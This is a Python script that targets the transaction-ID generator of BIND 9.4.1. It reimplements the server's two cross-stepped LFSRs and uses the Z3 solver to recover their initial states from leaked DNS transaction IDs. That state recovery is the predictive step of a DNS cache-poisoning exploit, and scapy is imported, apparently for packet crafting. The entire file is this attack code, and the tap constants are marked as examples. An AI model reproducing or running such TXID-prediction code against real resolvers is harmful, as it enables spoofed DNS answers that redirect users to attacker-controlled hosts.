from scapy.all import *
import z3
TAP1 = 0x80000057  # Example 32-bit tap
TAP2 = 0x80000062  # Example 32-bit tap
STATE_BITS = 32

def generate(state, tap):
    """equal to the generate function in bind 9.4.1"""
    if  state & 0x1 == 1:
        state = (state>>1)^ tap
    else:
        state = state>>1
    return state

def step_cross(lfsr1, lfsr2):
    """equivalent to the isc_lfsr_generate32() function in bind 9.4.1"""

    skip1 = lfsr2 & 0x1
    skip2 = lfsr1 & 0x1

    if skip1: lfsr1 = generate(lfsr1, TAP1)
    if skip2: lfsr2 = generate(lfsr2, TAP2)

    new1 = generate(lfsr1, TAP1)
    new2 = generate(lfsr2, TAP2)

    return new1, new2, (new1 ^ new2) & 0xFFFF 



def z3_generate(state, tap):
    """
    Symbolic representation of the LFSR step.
    """
    lsb = state & 0x1
    # MUST use LShR for logical shift right in Z3, NOT >>
    shifted = z3.LShR(state, 1)
    return z3.If(lsb == 1, shifted ^ tap, shifted)

def z3_step_cross(lfsr1, lfsr2, tap1, tap2):
    """
    Symbolic equivalent of step-cros
    """
    skip1 = lfsr2 & 0x1
    skip2 = lfsr1 & 0x1
    
    # If skip condition met, advance state, otherwise keep current
    lfsr1_skipped = z3.If(skip1 == 1, z3_generate(lfsr1, tap1), lfsr1)
    lfsr2_skipped = z3.If(skip2 == 1, z3_generate(lfsr2, tap2), lfsr2)
    
    # Generate new states
    new1 = z3_generate(lfsr1_skipped, tap1)
    new2 = z3_generate(lfsr2_skipped, tap2)
    
    # The output is the XOR of the two new states, masked to 16 bits
    out = (new1 ^ new2) & 0xFFFF
    
    return new1, new2, out

def find_initial_states(leaked_txids):
    print("[*] Initializing Z3 Solver...")
    s = z3.Solver()
    # Define the initial unknown symbolic states
    state1 = z3.BitVec('lfsr1_init', STATE_BITS)
    state2 = z3.BitVec('lfsr2_init', STATE_BITS)

    # Keep track of the moving state variables
    curr_state1 = state1
    curr_state2 = state2

    print("[*] Feeding {} leaked TXIDs into constraints...".format(len(leaked_txids)))
    for i, leak in enumerate(leaked_txids):
        curr_state1, curr_state2, out = z3_step_cross(curr_state1, curr_state2, TAP1, TAP2)
        s.add(out == leak)


    print("[*] Solving for initial states...")
    found_init1 = None
    found_init2 = None
    if s.check() == z3.sat:
        m = s.model()
        
        found_init1 = m[state1].as_long()
        found_init2 = m[state2].as_long()
        print("[+] Found state: lfsr1={}, lfsr2={}".format(found_init1, found_init2))
        return found_init1, found_init2
        
    else:
        print("[-] UNSAT. The solver could not find a valid state.")
        print("    Double-check your taps, your generate() logic, and ensure the leaks are contiguous.")
        exit(-1)